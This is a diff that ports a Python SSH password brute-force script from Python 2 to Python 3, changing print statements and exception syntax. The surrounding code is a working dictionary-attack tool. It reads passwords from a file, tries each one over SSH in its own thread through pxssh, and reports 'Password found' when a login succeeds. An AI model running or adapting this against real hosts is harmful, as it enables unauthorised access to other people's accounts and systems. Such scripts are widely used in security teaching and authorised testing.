@@ -1,3 +1,4 @@
+from __future__ import print_function
 import pxssh
 import optparse
 import time
@@ -12,9 +13,9 @@ def connect(host, user, pw, release):
     try:
         s = pxssh.pxssh()
         s.login(host, user, pw)
-        print '[+] Password found: ' + pw
+        print('[+] Password found: ' + pw)
         found = True
-    except Exception, e:
+    except Exception as e:
         if 'read_nonblocking' in str(e):
             fails += 1
             time.sleep(5)
@@ -34,19 +35,19 @@ def main():
     passFile = options.passwdFile
     user = options.user
     if host == None or passFile == None or user == None:
-        print parser.usage
+        print(parser.usage)
         exit(0)
     fn = open(passFile, 'r')
     for line in fn.readlines():
         if found:
-            print "[*] Exiting: Password found"
+            print("[*] Exiting: Password found")
             exit(0)
         if fails > 5:
-            print "[!] Exiting: Too Many SOcket Timeouts"
+            print("[!] Exiting: Too Many SOcket Timeouts")
             exit(0)
         connection_lock.acquire()
         password = line.strip("\r").strip("\n")
-        print "[-] Testing: " + str(password)
+        print("[-] Testing: " + str(password))
         t = Thread(target=connect, args=(host, user, password, True))
         child = t.start()
 if __name__ == '__main__':
